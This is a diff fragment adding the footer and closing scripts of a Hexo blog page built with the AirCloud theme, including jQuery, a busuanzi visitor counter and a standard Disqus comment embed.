+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
